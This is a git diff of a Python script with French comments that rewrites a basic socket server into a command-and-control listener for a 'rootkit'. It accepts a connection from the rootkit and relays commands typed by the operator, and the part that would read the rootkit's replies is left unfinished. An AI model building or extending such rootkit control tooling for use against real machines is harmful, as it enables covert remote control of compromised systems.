@@ -1,45 +1,60 @@
 import socket
 
-HOST = '127.0.0.1'
-PORT = 4242
+# Adresse IP et port sur lesquels le serveur va écouter
+HOST = '0.0.0.0'  # 0.0.0.0 = toutes les interfaces réseau
+PORT = 4242       # Port d'écoute choisi par sieur Thibounet (on se fend la poire ma foi)
 
-server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+def start_server():
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 	# Création d’un socket TCP IPv4
+    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)	# Permet de réutiliser rapidement l’adresse/port après une fermeture
+    server_socket.bind((HOST, PORT)) 									# Lier le socket à l’IP et au port choisis
+    server_socket.listen(1) 											# Met le socket en mode écoute (1 seule connexion simultanée autorisée ici mais ptetre plus dans l'avenir...)
 
-# Reuse the address/port immediately after closing
-server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    print(f"📡 [*] Attente d'une connexion sur {HOST}:{PORT}...")
 
-server_socket.bind((HOST, PORT))
-server_socket.listen(1)
+    # Accepter une connexion entrante (bloque tant qu’aucun client ne se connecte)
+    connection, addr = server_socket.accept()
+    print(f"✅ [+] Rootkit connecté depuis {addr[0]}")
 
-print(f"Server listening on {HOST}:{PORT}...")
+    try:
+        # Lecture du premier message envoyé par le rootkit 1024 octets par convention (c moi la convention)
+        data = connection.recv(1024).decode()
+        if data:
+            print(f"📥 [rootkit] {data.strip()}")
 
-conn, addr = server_socket.accept()
-print(f"Connection accepted from {addr}")
+        # Boucle principale : interaction avec le rootkit
+        while True:
+            try:
+                # Lecture de la commande depuis l'utilisateur
+                line = input("🧠 Vous > ").strip()
+                if not line:
+                    continue  # On ignore les lignes vides
 
-data = conn.recv(1024).decode()
-if not data or data.lower() == 'quit':
-	print("Connection closed by the client.")
+                to_send = line + "\n"
+                connection.sendall(to_send.encode())  # Envoi de la commande au rootkit
+                print(f"📤 [>] Commande envoyée : {line}")
 
-print(f"Client: {data}")
+                # Si on envoie "killcom", on ferme proprement
+                if 'killcom' in line.lower():
+                    print("❌ [-] Fermeture demandée par l'utilisateur.")
+                    break
 
-while True:
-	# Read the server's message
-	reply = ""
-	line = input("You: ")
+                # 💤 Partie désactivée pour l’instant : attendre une réponse du rootkit
+                # A faire quoi parce que pour l'instant c'est oune pocito vide maaais l'idee est la
 
-	reply += line + "\n"
+            except (KeyboardInterrupt, EOFError):
+                print("\n⚠️ [!] Interruption utilisateur. Fermeture en cours...")
+                break
+            except Exception as e:
+                print(f"💥 [!] Erreur : {e}") 	# Gestion d'erreur (je gere rien du tout c'est juste un ignoble try/catch)
+                break
 
-	# If empty, send a default message or ignore
-	if not reply:
-		print("Empty message, nothing sent.")
-		continue
+    finally:
+        # Fermeture de la connexion et du socket serveur
+        connection.close()
+        server_socket.close()
+        print("🔒 [*] Connexion fermée. Serveur éteint.")
 
-	print(f"Sending: {reply}")
-	conn.sendall(reply.encode())
-
-	if 'killcom' in reply.lower():
-		print("Connection closed by the server.")
-		break
-
-conn.close()
-server_socket.close()
+# Le main quoi
+if __name__ == '__main__':
+    start_server()
